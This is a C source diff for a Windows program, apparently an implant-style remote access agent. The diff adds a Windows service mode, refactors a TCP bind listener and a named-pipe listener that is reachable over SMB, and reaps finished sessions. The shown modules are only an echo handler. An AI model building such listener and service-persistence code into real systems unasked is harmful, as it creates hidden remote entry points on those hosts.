@@ -61,21 +61,14 @@ __attribute__((used)) const sq_hovel_config squatter_transport_config = {
 static SOCKET g_listen = INVALID_SOCKET;
 static HANDLE g_pipe_listener = INVALID_HANDLE_VALUE;
 static volatile int g_stop = 0;
+static SERVICE_STATUS_HANDLE g_service_status_handle = NULL;
+
+static void stop_listeners(void);
 
 static BOOL WINAPI on_ctrl(DWORD type)
 {
     (void)type;
-    g_stop = 1;
-    if (g_listen != INVALID_SOCKET) {
-        SOCKET s = g_listen;
-        g_listen = INVALID_SOCKET;
-        (void)closesocket(s); /* unblock accept() */
-    }
-    if (g_pipe_listener != INVALID_HANDLE_VALUE) {
-        HANDLE h = g_pipe_listener;
-        g_pipe_listener = INVALID_HANDLE_VALUE;
-        (void)CloseHandle(h); /* unblock ConnectNamedPipe() */
-    }
+    stop_listeners();
     return TRUE;
 }
 
@@ -107,6 +100,61 @@ static SOCKET listen_on(const wchar_t *port)
     }
     FreeAddrInfoW(res);
     return s;
+}
+
+static int wide_eq(const wchar_t *a, const wchar_t *b)
+{
+    while (*a != L'\0' && *b != L'\0' && *a == *b) {
+        a++;
+        b++;
+    }
+    return *a == *b;
+}
+
+static void stop_listeners(void)
+{
+    g_stop = 1;
+    if (g_listen != INVALID_SOCKET) {
+        SOCKET s = g_listen;
+        g_listen = INVALID_SOCKET;
+        (void)closesocket(s);
+    }
+    if (g_pipe_listener != INVALID_HANDLE_VALUE) {
+        HANDLE h = g_pipe_listener;
+        g_pipe_listener = INVALID_HANDLE_VALUE;
+        (void)CloseHandle(h);
+    }
+}
+
+static void report_service_status(DWORD state, DWORD exit_code, DWORD wait_hint)
+{
+    SERVICE_STATUS status;
+
+    if (g_service_status_handle == NULL) {
+        return;
+    }
+    ZeroMemory(&status, sizeof status);
+    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+    status.dwCurrentState = state;
+    status.dwControlsAccepted =
+        (state == SERVICE_RUNNING) ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN) : 0;
+    status.dwWin32ExitCode = exit_code;
+    status.dwWaitHint = wait_hint;
+    (void)SetServiceStatus(g_service_status_handle, &status);
+}
+
+static DWORD WINAPI on_service_control(DWORD control, DWORD event_type,
+                                       LPVOID event_data, LPVOID context)
+{
+    (void)event_type;
+    (void)event_data;
+    (void)context;
+
+    if (control == SERVICE_CONTROL_STOP || control == SERVICE_CONTROL_SHUTDOWN) {
+        report_service_status(SERVICE_STOP_PENDING, NO_ERROR, 3000);
+        stop_listeners();
+    }
+    return NO_ERROR;
 }
 
 static HANDLE create_pipe_instance(const wchar_t *pipe_name)
@@ -165,6 +213,22 @@ static void run_single_session(SOCKET socket, const sq_module_table *table)
     sq_session_destroy(session);
 }
 
+static void reap_done_sessions(sq_session **sessions, int *session_count)
+{
+    int i = 0;
+
+    while (i < *session_count) {
+        if (sq_session_done(sessions[i])) {
+            sq_session_destroy(sessions[i]);
+            sessions[i] = sessions[*session_count - 1];
+            sessions[*session_count - 1] = NULL;
+            (*session_count)--;
+            continue;
+        }
+        i++;
+    }
+}
+
 static void run_named_pipe_server(const wchar_t *pipe_name,
                                   const sq_module_table *table)
 {
@@ -172,6 +236,7 @@ static void run_named_pipe_server(const wchar_t *pipe_name,
     int session_count = 0;
     int i = 0;
 
+    ZeroMemory(sessions, sizeof sessions);
     SQLOG_INFO(SQLOG_SUB_MUX,
                L"listening on named pipe %s; connect over SMB as \\\\HOST\\pipe\\...",
                pipe_name);
@@ -182,6 +247,7 @@ static void run_named_pipe_server(const wchar_t *pipe_name,
         sq_channel *ch = NULL;
         sq_session *s = NULL;
 
+        reap_done_sessions(sessions, &session_count);
         g_pipe_listener = pipe;
         if (pipe == INVALID_HANDLE_VALUE) {
             SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, GetLastError(),
@@ -223,9 +289,11 @@ static void run_named_pipe_server(const wchar_t *pipe_name,
             sq_channel_free(ch);
             continue;
         }
+        reap_done_sessions(sessions, &session_count);
         if (session_count < SQ_MAX_SESSIONS) {
             sessions[session_count++] = s;
         } else {
+            SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping pipe connection");
             sq_session_destroy(s);
         }
     }
@@ -234,6 +302,61 @@ static void run_named_pipe_server(const wchar_t *pipe_name,
     for (i = 0; i < session_count; i++) {
         sq_session_destroy(sessions[i]);
     }
+}
+
+static int run_tcp_bind_server(const wchar_t *port, const sq_module_table *table)
+{
+    sq_session *sessions[SQ_MAX_SESSIONS];
+    int session_count = 0;
+    int i = 0;
+
+    ZeroMemory(sessions, sizeof sessions);
+    g_listen = listen_on(port);
+    if (g_listen == INVALID_SOCKET) {
+        SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to listen on port %s (in use?)", port);
+        return 1;
+    }
+    SQLOG_INFO(SQLOG_SUB_MUX,
+               L"listening on port %s (module: echo); Ctrl-C to stop", port);
+
+    while (!g_stop) {
+        SOCKET client = INVALID_SOCKET;
+        sq_channel *ch = NULL;
+        sq_session *s = NULL;
+
+        reap_done_sessions(sessions, &session_count);
+        client = accept(g_listen, NULL, NULL);
+        if (client == INVALID_SOCKET) {
+            if (g_stop) {
+                break;
+            }
+            continue;
+        }
+        SQLOG_INFO(SQLOG_SUB_MUX, L"connection accepted");
+        ch = sq_channel_from_socket(client);
+        if (ch == NULL) {
+            (void)closesocket(client);
+            continue;
+        }
+        s = sq_session_create(ch, table);
+        if (s == NULL) {
+            sq_channel_free(ch);
+            continue;
+        }
+        reap_done_sessions(sessions, &session_count);
+        if (session_count < SQ_MAX_SESSIONS) {
+            sessions[session_count++] = s;
+        } else {
+            SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping connection");
+            sq_session_destroy(s);
+        }
+    }
+
+    SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d session(s))", session_count);
+    for (i = 0; i < session_count; i++) {
+        sq_session_destroy(sessions[i]);
+    }
+    return 0;
 }
 
 static const wchar_t *configured_port(const sq_hovel_config *config,
@@ -249,6 +372,60 @@ static const wchar_t *configured_port(const sq_hovel_config *config,
     return L"9100";
 }
 
+typedef struct sq_service_context {
+    wchar_t *service_name;
+    const wchar_t *port;
+    const sq_module_table *table;
+} sq_service_context;
+
+static sq_service_context g_service_context;
+
+static void WINAPI service_main(DWORD argc, LPWSTR *argv)
+{
+    WSADATA wsa;
+    int rc = 1;
+
+    (void)argc;
+    (void)argv;
+
+    g_service_status_handle = RegisterServiceCtrlHandlerExW(
+        g_service_context.service_name, on_service_control, NULL);
+    if (g_service_status_handle == NULL) {
+        return;
+    }
+    report_service_status(SERVICE_START_PENDING, NO_ERROR, 3000);
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        report_service_status(SERVICE_STOPPED, ERROR_SERVICE_SPECIFIC_ERROR, 0);
+        return;
+    }
+    report_service_status(SERVICE_RUNNING, NO_ERROR, 0);
+    rc = run_tcp_bind_server(g_service_context.port, g_service_context.table);
+    (void)WSACleanup();
+    report_service_status(SERVICE_STOPPED,
+                          (rc == 0) ? NO_ERROR : ERROR_SERVICE_SPECIFIC_ERROR,
+                          0);
+}
+
+static int run_as_service(wchar_t *service_name, const wchar_t *port,
+                          const sq_module_table *table)
+{
+    SERVICE_TABLE_ENTRYW dispatch[2];
+
+    g_service_context.service_name = service_name;
+    g_service_context.port = port;
+    g_service_context.table = table;
+    dispatch[0].lpServiceName = service_name;
+    dispatch[0].lpServiceProc = service_main;
+    dispatch[1].lpServiceName = NULL;
+    dispatch[1].lpServiceProc = NULL;
+    if (StartServiceCtrlDispatcherW(dispatch) != 0) {
+        return 0;
+    }
+    SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, GetLastError(),
+                 L"StartServiceCtrlDispatcherW failed; falling back to console mode");
+    return -1;
+}
+
 int wmain(int argc, wchar_t **argv); /* -municode entry; declare to satisfy -Wmissing-prototypes */
 
 int wmain(int argc, wchar_t **argv)
@@ -261,15 +438,29 @@ int wmain(int argc, wchar_t **argv)
     static const sq_module_table table = {
         modules, (int)(sizeof modules / sizeof modules[0])};
     wchar_t configured_port_buffer[16];
-    sq_session *sessions[SQ_MAX_SESSIONS];
-    int session_count = 0;
-    const wchar_t *port = (argc > 1) ? argv[1] :
-        configured_port(&squatter_transport_config, configured_port_buffer);
+    const wchar_t *port = configured_port(&squatter_transport_config, configured_port_buffer);
+    wchar_t *service_name = NULL;
     WSADATA wsa;
     int i = 0;
 
+    for (i = 1; i < argc; i++) {
+        if (wide_eq(argv[i], L"--service") && i + 1 < argc) {
+            service_name = argv[++i];
+        } else if (argv[i][0] != L'\0') {
+            port = argv[i];
+        }
+    }
+
     sqlog_init();
     sqlog_set_level(SQLOG_LEVEL_INFO);
+
+    if (service_name != NULL) {
+        int service_rc = run_as_service(service_name, port, &table);
+        if (service_rc == 0) {
+            sqlog_shutdown();
+            return 0;
+        }
+    }
 
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         SQLOG_ERROR(SQLOG_SUB_MUX, L"WSAStartup failed");
@@ -295,49 +486,8 @@ int wmain(int argc, wchar_t **argv)
         sqlog_shutdown();
         return 0;
     }
-    g_listen = listen_on(port);
-    if (g_listen == INVALID_SOCKET) {
-        SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to listen on port %s (in use?)", port);
-        (void)WSACleanup();
-        return 1;
-    }
-    SQLOG_INFO(SQLOG_SUB_MUX,
-               L"listening on port %s (module: echo); Ctrl-C to stop", port);
-
-    for (;;) {
-        SOCKET client = accept(g_listen, NULL, NULL);
-        sq_channel *ch = NULL;
-        sq_session *s = NULL;
-
-        if (client == INVALID_SOCKET) {
-            if (g_stop) {
-                break;
-            }
-            continue;
-        }
-        SQLOG_INFO(SQLOG_SUB_MUX, L"connection accepted");
-        ch = sq_channel_from_socket(client);
-        if (ch == NULL) {
-            (void)closesocket(client);
-            continue;
-        }
-        s = sq_session_create(ch, &table);
-        if (s == NULL) {
-            sq_channel_free(ch);
-            continue;
-        }
-        if (session_count < SQ_MAX_SESSIONS) {
-            sessions[session_count++] = s;
-        } else {
-            sq_session_destroy(s); /* at capacity: do not retain */
-        }
-    }
-
-    SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d session(s))", session_count);
-    for (i = 0; i < session_count; i++) {
-        sq_session_destroy(sessions[i]);
-    }
+    i = run_tcp_bind_server(port, &table);
     (void)WSACleanup();
     sqlog_shutdown();
-    return 0;
+    return i;
 }
